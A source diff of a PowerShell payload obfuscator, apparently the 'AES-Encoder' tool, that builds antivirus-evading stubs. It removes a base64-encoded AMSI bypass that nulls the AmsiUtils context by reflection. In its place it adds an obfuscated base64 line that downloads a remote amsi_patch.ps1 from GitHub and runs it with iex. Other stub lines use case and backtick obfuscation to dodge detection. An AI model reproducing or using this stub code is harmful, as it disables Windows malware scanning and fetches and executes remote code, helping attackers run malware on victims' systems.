@@ -37,8 +37,7 @@ $ErrorActionPreference = "Stop"
 $PSDefaultParameterValues['*:ErrorAction']='Stop'
 
 function Create-Var() {
-        $set = "abcdefghijkmnopqrstuvwxyz1234567890"
-        (1..(10 + (Get-Random -Maximum 7)) | %{ $set[(Get-Random -Minimum 5 -Maximum $set.Length)] } ) -join ''
+        (1..7|%{[byte](Get-Random -Max 256)}|foreach ToString X2) -join '' 
 }
 
 function xorEnc {
@@ -224,7 +223,7 @@ function Invoke-AES-Encoder {
 
             $stub_template = ''
             $code_alternatives  = @()
-			$code_alternatives += '([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("Zm9yZWFjaCgkaSBpbiBbUmVmXS5Bc3NlbWJseS5HZXRUeXBlcygpKXtpZigkaS5OYW1lIC1saWtlICIqc2lVIisiKiIrImlscyIpeyR1dGlsRnVuY3Rpb25zPSRpLkdldEZpZWxkcygnTm9uUHVibGljLFN0YXRpYycpfX07CiRtb3JlY29kZT0iYXNkYWdnd3J3YWdyd3dlZmVhZ3dnIgpmb3JlYWNoKCRmdW5jIGluICR1dGlsRnVuY3Rpb25zKXtpZigkZnVuYy5OYW1lIC1saWtlICIqQ29udGV4dCIpeyRhZGRyPSRmdW5jLkdldFZhbHVlKCRudWxsKX19OwokZGVhZGMwZGU9NDUxMjM0MTIzNTEyMzE1MjM1NjMyMzQ1CltJbnRwdHJdJHBvaW50ZXI9JGFkZHI7CiRkZWFkYjMzZj0ic3RyaW5nMTIzNDIzNDUzMTIzNSIKW0ludDMyW11dJG51bGxCeXRlPUAoMCk7CltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJG51bGxCeXRlLDAsJHBvaW50ZXIsMSk7")))|iex' + "`r`n"
+			$code_alternatives += '([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("aWV4IChpd3IgImh0dHBzOi8vZ2l0aHViLmNvbS9DaGFpbnNraS9BRVMtRW5jb2Rlci9yYXcvbWFpbi9hbXNpX3BhdGNoLnBzMSIgLXVzZWIp")))|i`e`x' + "`r`n"
             $code_alternatives += '${43} = [text.encoDiNg]::"uT`F`8".GetBYtES("{42}")' + "`r`n"
             $code_alternatives += '${44} = [tEXt.enCODINg]::"uT`F`8".gEtSTrinG([ConverT]::fRoMBasE64strIng("{0}"))' + "`r`n"
             $code_alternatives += '${45} = [TeXT.EnCodiNg]::"uT`F`8".GETBYTES(${44})' + "`r`n"
